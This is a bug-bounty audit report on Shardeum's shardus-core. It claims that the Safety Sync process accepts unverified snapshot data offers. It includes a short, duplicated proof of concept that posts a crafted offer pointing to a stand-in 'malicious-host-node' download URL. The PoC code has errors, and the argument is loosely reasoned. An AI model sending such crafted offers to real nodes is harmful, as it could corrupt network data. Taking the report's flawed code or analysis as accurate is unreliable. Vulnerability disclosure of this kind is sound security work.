# #35965 \[BC-Insight] Unverified data in safety sync

## #35965 \[BC-Insight] Unverified Data in Safety Sync

**Submitted on Oct 14th 2024 at 14:48:40 UTC by @Ouabala for** [**Audit Comp | Shardeum: Core II**](https://immunefi.com/audit-competition/shardeum-core-ii-boost)

* **Report ID:** #35965
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/shardeum/shardus-core/tree/dev>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours
  * Shutdown of greater than or equal to 30% of network processing nodes without brute force actions, but does not shut down the network
  * Data Corruption

### Description

\#Summary

The Safety Sync process in the Shardus Core codebase currently lacks verification of incoming data, which may allow an attacker to send corrupted or malicious data during the synchronization phase. This can lead to data integrity issues and potentially cause nodes to operate on invalid or harmful data, impacting the overall network reliability and safety.

## Details

The specific section of the code that raises this concern can be found in the Safety Sync process, where data offers are handled without adequate validation:

Vulnerable Code Line : <https://github.com/shardeum/shardus-core/blob/23e06ded6744d8521cff9d749c1f1dd482c5fcb6/src/snapshot/index.ts#L455>

\`\`\` const offer = createOffer()

// Send data offer to each node for (let i = 0; i < nodesToSendData.length; i++) { const res = await http.post( \`${nodesToSendData\[i].externalIp}:${nodesToSendData\[i].externalPort}/snapshot-data-offer\`, offer ).catch((e) => { console.error('Error sending data offer to node', e) }) }

\`\`\`

In the above code snippet, the offer object is sent to multiple nodes without any checks to verify its contents or the authenticity of the nodes. This creates an attack vector where a malicious node can impersonate a legitimate node and send false or corrupted data.

\#Proof of Concept (PoC)

An attacker can exploit this vulnerability by crafting a malicious data offer and sending it to a node. The following is a conceptual example demonstrating how this might be executed: Crafting a Malicious Offer:

\`\`\` const ManipulatedOffer = { networkStateHash: "maliciousHash", partitions: \["manipulatedPartition"], downloadUrl: "<http://malicious-host-node/download-snapshot-data>", }; ( Note that this only uses http in the original code which will let easly be intercapted with clear text )

const BadNode = { externalIp: "target-host-node-ip", externalPort: "target-node-port", };

await http.post( \`${BadNode.externalIp}:${Bad.externalPort}/snapshot-data-offer\`, ManipulatedOffer ).catch((e) => { console.error('Error sending malicious offer', e); });

\`\`\`

\#Potential Effects:

```
.The target node processes this malicious offer and starts syncing with corrupted data includes information about the current balances, transactions, and other vital data relevant to the network&#x27;s operation.

.Other nodes in the network that interact with this compromised node may also become affected.
```

Best, @Ouabala

### Link to Proof of Concept

<https://gist.githubusercontent.com/ShellInjector/4b4158beb24646e0133d88f0e7abdd04/raw/56c6032c6986ad07596706890f3b566018667d69/gistfile1.txt>

### Proof of Concept

### Proof of Concept

\`\`\` const ManipulatedOffer = { networkStateHash: "manipulatedHash", partitions: \["manipulatedPartition"], downloadUrl: "<http://malicious-host-node/download-snapshot-data>", }; ( Note that this only uses http in the original code which will let easly be intercapted with clear text )

const BadNode = { externalIp: "target-host-node-ip", externalPort: "target-node-port", };

await http.post( \`${BadNode.externalIp}:${Bad.externalPort}/snapshot-data-offer\`, ManipulatedOffer ).catch((e) => { console.error('Error sending malicious offer', e); });

\`\`\`
